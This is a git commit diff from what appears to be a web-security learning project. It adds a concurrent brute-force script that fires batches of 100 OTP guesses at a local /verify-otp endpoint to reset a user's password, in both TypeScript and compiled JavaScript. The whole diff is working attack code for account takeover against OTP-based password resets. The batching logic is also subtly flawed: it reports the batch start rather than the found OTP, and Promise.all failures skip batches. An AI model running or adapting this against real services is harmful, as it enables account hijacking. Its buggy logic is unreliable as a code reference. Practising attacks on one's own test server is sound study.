321c8637b47aff09e348201a495e0926c3f958da
vishal <vishalmahesh.study@gmail.com>
2024-06-21 00:17:59 +0530

    add batch processing of requests

--- websecurity/penetration-testing/attacker/dist/index.js
+++ websecurity/penetration-testing/attacker/dist/index.js
@@ -13,6 +13,7 @@ var __importDefault = (this && this.__importDefault) || function (mod) {
 };
 Object.defineProperty(exports, "__esModule", { value: true });
 const axios_1 = __importDefault(require("axios"));
+// Brute force attack - linear
 const hackServer = () => __awaiter(void 0, void 0, void 0, function* () {
     for (let i = 100000; i < 999999; i++) {
         try {
@@ -32,13 +33,45 @@ const hackServer = () => __awaiter(void 0, void 0, void 0, function* () {
         }
     }
 });
-hackServer();
-// const sendRequest = async () => {
-//   const res = await axios.post("http://localhost:3000/verify-otp", {
-//     email: "vishal@gmail.com",
-//     otp: "190",
-//     newPassword: "vishal123",
-//   });
-//   console.log(res.data);
-// };
-// sendRequest();
+// hackServer();
+const hackServerBatch = () => __awaiter(void 0, void 0, void 0, function* () {
+    for (let i = 100000; i < 1000000; i += 100) {
+        let found = false;
+        console.log(`Batch ${i}`);
+        let requests = [];
+        for (let j = 0; j < 100; j++) {
+            const otp = i + j;
+            const req = axios_1.default.post("http://localhost:3000/verify-otp", {
+                email: "vishal@gmail.com",
+                otp: otp.toString(),
+                newPassword: "vishal123",
+            });
+            requests.push(req);
+        }
+        try {
+            const res = yield Promise.all(requests);
+            for (let r of res) {
+                if (r.status === 200) {
+                    console.log(`OTP is ${i}`);
+                    found = true;
+                }
+            }
+        }
+        catch (e) {
+            continue;
+        }
+        if (found) {
+            break;
+        }
+    }
+});
+hackServerBatch();
+// single request
+const sendRequest = () => __awaiter(void 0, void 0, void 0, function* () {
+    const res = yield axios_1.default.post("http://localhost:3000/verify-otp", {
+        email: "vishal@gmail.com",
+        otp: "190",
+        newPassword: "vishal123",
+    });
+    console.log(res.data);
+});
--- websecurity/penetration-testing/attacker/src/index.ts
+++ websecurity/penetration-testing/attacker/src/index.ts
@@ -1,5 +1,6 @@
 import axios from "axios";
 
+// Brute force attack - linear
 const hackServer = async () => {
   for (let i = 100000; i < 999999; i++) {
     try {
@@ -20,16 +21,51 @@ const hackServer = async () => {
   }
 };
 
-hackServer();
+// hackServer();
 
-// const sendRequest = async () => {
-//   const res = await axios.post("http://localhost:3000/verify-otp", {
-//     email: "vishal@gmail.com",
-//     otp: "190",
-//     newPassword: "vishal123",
-//   });
+const hackServerBatch = async () => {
+  for (let i = 100000; i < 1000000; i += 100) {
+    let found = false;
+    console.log(`Batch ${i}`);
+    let requests = [];
+    for (let j = 0; j < 100; j++) {
+      const otp = i + j;
+      const req = axios.post("http://localhost:3000/verify-otp", {
+        email: "vishal@gmail.com",
+        otp: otp.toString(),
+        newPassword: "vishal123",
+      });
 
-//   console.log(res.data);
-// };
+      requests.push(req);
+    }
 
-// sendRequest();
+    try {
+      const res = await Promise.all(requests);
+      for (let r of res) {
+        if (r.status === 200) {
+          console.log(`OTP is ${i}`);
+          found = true;
+        }
+      }
+    } catch (e) {
+      continue;
+    }
+
+    if (found) {
+      break;
+    }
+  }
+};
+
+hackServerBatch();
+
+// single request
+const sendRequest = async () => {
+  const res = await axios.post("http://localhost:3000/verify-otp", {
+    email: "vishal@gmail.com",
+    otp: "190",
+    newPassword: "vishal123",
+  });
+
+  console.log(res.data);
+};
